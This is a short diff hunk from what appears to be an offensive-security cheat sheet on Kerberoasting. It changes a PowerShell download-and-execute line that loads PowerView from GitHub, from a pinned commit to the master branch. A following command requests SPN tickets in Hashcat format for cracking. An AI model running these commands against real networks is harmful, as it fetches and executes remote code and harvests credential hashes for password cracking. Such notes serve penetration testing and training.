@@ -33,7 +33,7 @@ Against single user using Rubeus.exe:
 
 Using Powerview:   
 ``` 
-IEX ((New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4cedfa1c308a1bc37530725734290d506c0170dd/Recon/PowerView.ps1"))
+IEX ((New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"))
 Request-SPNTicket -SPN "<SPN>" -Format Hashcat
 ```     
 Using Invoke-Kerberoast:    
